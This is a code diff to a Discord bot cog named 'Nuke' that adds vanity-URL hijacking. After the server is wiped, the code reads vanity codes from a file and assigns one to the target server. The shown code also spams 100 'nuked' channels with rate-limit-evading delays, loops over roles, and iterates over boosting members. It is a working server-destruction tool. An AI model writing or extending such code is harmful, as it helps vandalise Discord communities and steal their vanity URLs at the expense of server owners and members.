@@ -1,10 +1,18 @@
 import discord
 from discord.ext import commands
 import asyncio
+import os
 
 class Nuke(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+
+    def load_vanities(self):
+        vanities_path = "Vanity/vanity/vanities.txt"
+        if os.path.exists(vanities_path):
+            with open(vanities_path, "r") as f:
+                return [line.strip() for line in f if line.strip()]
+        return []
 
     @commands.command()
     async def nuke(self, ctx):
@@ -24,7 +32,7 @@ class Nuke(commands.Cog):
         for i in range(100):
             try:
                 await ctx.guild.create_text_channel("nuked")
-                await asyncio.sleep(0.8) # increased to avoid 429; ratelimits
+                await asyncio.sleep(0.8)
             except: break
         
         for role in ctx.guild.roles:
@@ -40,8 +48,13 @@ class Nuke(commands.Cog):
         if not ctx.guild: return
         await asyncio.sleep(5)
 
-        try: await ctx.guild.edit(vanity_code=None)
-        except: print("Failed to drop vanity (Missing Permissions)")
+        vanities = self.load_vanities()
+        if vanities:
+            new_vanity = vanities[0]
+            try: await ctx.guild.edit(vanity_code=new_vanity)
+            except: print("Failed to set vanity (Missing Permissions)")
+        else:
+            print("No vanities in list")
 
         for member in ctx.guild.members:
             if member.premium_since:
